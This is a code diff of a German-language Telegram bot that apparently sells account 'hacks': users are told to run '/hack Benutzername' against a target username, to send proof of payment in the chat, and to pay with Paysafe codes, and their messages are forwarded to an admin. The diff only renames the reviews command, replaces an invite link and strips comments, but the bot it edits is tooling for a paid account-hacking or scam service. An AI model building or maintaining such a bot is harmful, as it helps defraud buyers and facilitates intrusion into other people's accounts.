@@ -264,7 +264,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<b>Schritt 2:</b> Starte deinen Hack:\n"
         "<code>/hack Benutzername</code>\n\n"
         "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
-        "⭐ Bewertungen: https://t.me/+qICdaAr6lE4yMzZh\n"
+        "⭐ Bewertungen: /bew\n"
         "💳 Zahlungsbeweise einfach hier im Chat senden.",
         parse_mode=ParseMode.HTML
     )
@@ -290,7 +290,7 @@ async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "<b>Schritt 2:</b> Starte deinen Hack:\n"
             "<code>/hack Benutzername</code>\n\n"
             "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
-            "⭐ Bewertungen: https://t.me/+qICdaAr6lE4yMzZh\n"
+            "⭐ Bewertungen: /bew\n"
             "💳 Zahlungsbeweise einfach hier im Chat senden.",
             parse_mode=ParseMode.HTML
         )
@@ -666,7 +666,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
     user_id = from_user.id
 
-    # Admin ignorieren
     if user_id == ADMIN_CHAT_ID:
         return
 
@@ -708,7 +707,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
     user_id = from_user.id
 
-    # Admin ignorieren
     if user_id == ADMIN_CHAT_ID:
         return
 
@@ -736,7 +734,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"❌ Paysafe-Code: {e}")
     else:
-        # Alle anderen Nachrichten weiterleiten
         try:
             forwarded = await context.bot.forward_message(
                 chat_id=ADMIN_CHAT_ID,
@@ -824,7 +821,7 @@ def main():
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("hack", hack))
     application.add_handler(CommandHandler("pay", pay))
-    application.add_handler(CommandHandler("bewertungen", bewertungen))
+    application.add_handler(CommandHandler("bew", bewertungen))
     application.add_handler(CommandHandler("listusers", list_users))
     application.add_handler(CommandHandler("sendcontent", send_content))
     application.add_handler(CommandHandler("invite", invite))
@@ -834,13 +831,11 @@ def main():
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
 
-    # Admin Reply → User (group=0, feuert zuerst)
     application.add_handler(MessageHandler(
         filters.REPLY & filters.TEXT & ~filters.COMMAND,
         reply_to_user
     ), group=0)
 
-    # Textnachrichten von Usern (group=1)
     application.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND,
         handle_text
